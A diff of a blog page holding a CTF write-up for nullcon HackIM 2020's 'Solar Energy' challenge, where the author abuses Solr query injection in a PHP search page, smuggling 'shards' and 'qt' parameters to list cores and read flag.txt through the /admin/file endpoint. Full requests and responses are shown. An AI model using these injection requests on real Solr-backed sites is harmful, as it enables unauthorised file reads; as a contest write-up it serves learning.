@@ -24,7 +24,7 @@ nullcon HackIM 2020 - Solar Energy - bilith&#39;s blog
 
 
 
-<link rel="stylesheet" href="/css/main.min.725d14cbcf85ae2827aa3f8025935e2b7eeb509a0f727f5a511b9de33cbffc18.css" integrity="sha256-cl0Uy8&#43;Frignqj&#43;AJZNeK37rUJoPcn9aURud4zy//Bg=" crossorigin="anonymous" media="screen">
+<link rel="stylesheet" href="/css/main.min.61c06aa2078e3435ab207d6fa96a578128e34b3983fb12bcba3a93cdf4fb26e7.css" integrity="sha256-YcBqogeONDWrIH1vqWpXgSjjSzmD&#43;xK8ujqTzfT7Juc=" crossorigin="anonymous" media="screen">
 
 
 
@@ -64,7 +64,7 @@ On the previous weekend I played nullcon HackIM 2020 CTF. In the end our team ma
 
         
 <div class="section" id="content">
-    Mon Feb 17, 2020 &#183; 738 words
+    Mon Feb 17, 2020 &#183; 834 words
     
     <div class="tag-container">
         
@@ -121,7 +121,8 @@ X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHP
 Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">281</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-
+   <span style="color:#ae81ff"> </span>
+{&#34;error&#34;<span style="color:#f92672">:</span><span style="color:#ae81ff">{&#34;metadata&#34;:[&#34;error-class&#34;,&#34;org.apache.solr.common.SolrException&#34;,&#34;root-error-class&#34;,&#34;org.apache.solr.parser.TokenMgrError&#34;],&#34;msg&#34;:&#34;org.apache.solr.search.SyntaxError: Cannot parse &#39;book\&#34;&#39;: Lexical error at line 1, column 6.  Encountered: &lt;EOF&gt; after : \&#34;\&#34;&#34;,&#34;code&#34;:400}}</span>
 </code></pre></div><p>After that we knew what we are dealing with since the error was pretty verbose. The first thing I googled was <code>Solr injection</code>. Googling lead me to <a href="https://github.com/veracode-research/solr-injection">this github repo</a>. It basicly contains description and payloads for <code>Solr query injection</code> vulnerability. I tested most of them, but none seemd to work. However we were sure that we can inject something, because of the error we&rsquo;ve got eariler.<br>
 Application is vulnerable to Solr query injection when frontend application is issuing HTTP request to Solr API <strong>without</strong> url encoding query value. This allows the user for passing more that just one parameter in the request to the Solr backend.<br>
 After couple more hours and dozens of Solr documentation pages later we managed to list all the cores, which are basicly the same thing what indexes are in Elastic Search or a database is in traditional, relational database.</p>
@@ -140,7 +141,12 @@ X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHP
 Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">2792</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-
+   <span style="color:#ae81ff"> </span>
+<span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">J</span><span style="color:#960050;background-color:#1e0010">U</span><span style="color:#960050;background-color:#1e0010">N</span><span style="color:#960050;background-color:#1e0010">K</span><span style="color:#960050;background-color:#1e0010">&gt;</span>   <span style="color:#ae81ff"> </span>
+<span style="color:#960050;background-color:#1e0010">{</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#960050;background-color:#1e0010">n</span>    <span style="color:#ae81ff">\&#34;SeCrEtSeArCh8888\&#34;:{\n      \&#34;name\&#34;:\&#34;SeCrEtSeArCh8888\&#34;,\n      \&#34;instanceDir\&#34;:\&#34;\/var\/solr\/data\/SeCrEtSeArCh8888\&#34;,\n      \&#34;dataDir\&#34;:\&#34;\/var\/solr\/data\/SeCrEtSeArCh8888\/data\/\&#34;,\n      \&#34;config\&#34;:\&#34;solrconfig.xml\&#34;,\n      \&#34;schema\&#34;:\&#34;managed-schema\&#34;,\n   </span>
+<span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">J</span><span style="color:#960050;background-color:#1e0010">U</span><span style="color:#960050;background-color:#1e0010">N</span><span style="color:#960050;background-color:#1e0010">K</span><span style="color:#960050;background-color:#1e0010">&gt;</span>   <span style="color:#ae81ff"> </span>
+  <span style="color:#ae81ff">\&#34;hackimsearch\&#34;:{\n      \&#34;name\&#34;:\&#34;hackimsearch\&#34;,\n      \&#34;instanceDir\&#34;:\&#34;\/var\/solr\/data\/hackimsearch\&#34;,\n      \&#34;dataDir\&#34;:\&#34;\/var\/solr\/data\/hackimsearch\/data\/\&#34;,\n      \&#34;config\&#34;:\&#34;solrconfig.xml\&#34;,\n      \&#34;schema\&#34;:\&#34;managed-schema\&#34;,\n </span>
+<span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">J</span><span style="color:#960050;background-color:#1e0010">U</span><span style="color:#960050;background-color:#1e0010">N</span><span style="color:#960050;background-color:#1e0010">K</span><span style="color:#960050;background-color:#1e0010">&gt;</span>   <span style="color:#ae81ff"> </span>
 </code></pre></div><p>In the request we injected two additional Solr request parameters, <strong>shards</strong> and <strong>qt</strong>. Both of them combined allowed for rewriting the request URL. Important thing is that the values of these parameters had to be double url encoded, since they will be decoded and passed to another HTTP request. Another thing to notice is that we had to smuggle another two paramters in <strong>qt</strong> parameter, which were <strong>action</strong> and <strong>wt</strong>. First one is responsible for choosing what action you wanna take and the second one for the response format (if we would pass <code>json</code> value we would simply get <code>500 java.lang.NullPointerException</code>).<br>
 There were two cores, <code>hackimsearch</code>, which contained all the data about books, and the second one called <code>SeCrEtSeArCh8888</code>. We listed secret core&rsquo;s documents hoping that there will be a flag somewhere:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">GET</span> /search.php?search=&lt;@urlencode_all_8&gt;book&amp;shards=localhost%3a8983/&amp;qt=/solr/SeCrEtSeArCh8888/query%3fq%3d*&lt;@/urlencode_all_8&gt; <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
@@ -158,7 +164,8 @@ X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHP
 Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">186</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-
+   <span style="color:#ae81ff"> </span>
+{&#34;response&#34;<span style="color:#f92672">:</span><span style="color:#ae81ff">{&#34;numFound&#34;:1,&#34;start&#34;:0,&#34;maxScore&#34;:1,&#34;docs&#34;:[{&#34;id&#34;:&#34;secret&#34;,&#34;flag&#34;:[&#34;Great job but flag is not here. Maybe you should hit the filesystem&#34;],&#34;_version_&#34;:1658146505195782144}]}}    </span>
 </code></pre></div><p>Unfortunately, not quite there yet. But we knew we were close and what we needed to do next.<br>
 After another round of going through the documentation, one thing caught my attention. It was API endpoint <code>/admin/file</code>. Issuing request with just <strong>wt</strong> parameter, allowned us for listing of all the files within core&rsquo;s working directory:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">GET</span> /search.php?search=&lt;@urlencode_all_8&gt;book&amp;shards=localhost:8983/&amp;qt=/solr/SeCrEtSeArCh8888/admin/file%3fwt%3djson&amp;debug=all&lt;@/urlencode_all_8&gt; <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
@@ -169,7 +176,6 @@ Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">
 Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
 Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://web3.ctf.nullcon.net:8080/</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
-
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
 Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mon, 10 Feb 2020 15:27:45 GMT</span>
 Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Apache/2.4.10 (Debian)</span>
@@ -177,30 +183,31 @@ X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHP
 Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1077</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-
+   <span style="color:#ae81ff"> </span>
+{&#34;error&#34;<span style="color:#f92672">:</span><span style="color:#ae81ff">{&#34;metadata&#34;:[&#34;error-class&#34;,&#34;org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException&#34;,&#34;root-error-class&#34;,&#34;org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException&#34;],&#34;msg&#34;:&#34;Error from server at null: Expected mime type application\/octet-stream but got text\/plain. {\n  \&#34;responseHeader\&#34;:{\n    \&#34;status\&#34;:0,\n    \&#34;QTime\&#34;:0},\n  \&#34;files\&#34;:{\n    \&#34;protwords.txt\&#34;:{\n      \&#34;size\&#34;:873,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:36.990Z\&#34;},\n    \&#34;lang\&#34;:{\n      \&#34;directory\&#34;:true,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:36.990Z\&#34;},\n    \&#34;solrconfig.xml\&#34;:{\n      \&#34;size\&#34;:49058,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:36.990Z\&#34;},\n    \&#34;flag.txt\&#34;:{\n      \&#34;size\&#34;:50,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:48:37.946Z\&#34;},\n    \&#34;managed-schema\&#34;:{\n      \&#34;size\&#34;:30770,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:54.026Z\&#34;},\n    \&#34;stopwords.txt\&#34;:{\n      \&#34;size\&#34;:781,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:36.990Z\&#34;},\n    \&#34;synonyms.txt\&#34;:{\n      \&#34;size\&#34;:1124,\n      \&#34;modified\&#34;:\&#34;2020-02-10T10:42:36.990Z\&#34;}}}\n&#34;,&#34;code&#34;:200}}    </span>
 </code></pre></div><p>More readable output:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">    <span style="color:#e6db74">&#34;protwords.txt&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">873</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:36.990Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;lang&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;directory&#34;</span>:<span style="color:#66d9ef">true</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:36.990Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;solrconfig.xml&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">49058</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:36.990Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;flag.txt&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">50</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:48:37.946Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;managed-schema&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">30770</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:54.026Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;stopwords.txt&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">781</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:36.990Z&#34;</span>}<span style="color:#960050;background-color:#1e0010">,</span>
-    <span style="color:#e6db74">&#34;synonyms.txt&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
-     <span style="color:#f92672">&#34;size&#34;</span>:<span style="color:#ae81ff">1124</span>,
-     <span style="color:#f92672">&#34;modified&#34;</span>:<span style="color:#e6db74">&#34;2020-02-10T10:42:36.990Z&#34;</span>}
-</code></pre></div><p>So, there it was, <code>flag.txt</code>. Now we only need to read it. Luckly I was able to pretty quickly find additional parameters, that, despite content type, read the file:</p>
+<pre><code>    &quot;protwords.txt&quot;:{
+     &quot;size&quot;:873,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:36.990Z&quot;},
+    &quot;lang&quot;:{
+     &quot;directory&quot;:true,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:36.990Z&quot;},
+    &quot;solrconfig.xml&quot;:{
+     &quot;size&quot;:49058,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:36.990Z&quot;},
+    &quot;flag.txt&quot;:{
+     &quot;size&quot;:50,
+     &quot;modified&quot;:&quot;2020-02-10T10:48:37.946Z&quot;},
+    &quot;managed-schema&quot;:{
+     &quot;size&quot;:30770,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:54.026Z&quot;},
+    &quot;stopwords.txt&quot;:{
+     &quot;size&quot;:781,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:36.990Z&quot;},
+    &quot;synonyms.txt&quot;:{
+     &quot;size&quot;:1124,
+     &quot;modified&quot;:&quot;2020-02-10T10:42:36.990Z&quot;}
+</code></pre><p>So, there it was, <code>flag.txt</code>. Now we only need to read it. Luckly I was able to pretty quickly find additional parameters, that, despite content type, read the file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">GET</span> /search.php?search=&lt;@urlencode_all_8&gt;book&amp;shards=localhost%3a8983/&amp;qt=/solr/SeCrEtSeArCh8888/admin/file%3fwt%3djson%26file%3dflag.txt%26contentType%3dtext/plain&lt;@/urlencode_all_8&gt; <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:8080</span>
 User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
@@ -216,7 +223,8 @@ X-Powered-By<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHP
 Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">371</span>
 Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
 Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
-
+   <span style="color:#ae81ff"> </span>
+{&#34;error&#34;<span style="color:#f92672">:</span><span style="color:#ae81ff">{&#34;metadata&#34;:[&#34;error-class&#34;,&#34;org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException&#34;,&#34;root-error-class&#34;,&#34;org.apache.solr.client.solrj.impl.BaseHttpSolrClient$RemoteSolrException&#34;],&#34;msg&#34;:&#34;Error from server at null: Expected mime type application\/octet-stream but got text\/plain. hackim20{Content_Mismatch_helps_you_all_the_Time}\n&#34;,&#34;code&#34;:200}}    </span>
 </code></pre></div><p>And there it was <code>hackim20{Content_Mismatch_helps_you_all_the_Time}</code></p>
 
 </div>
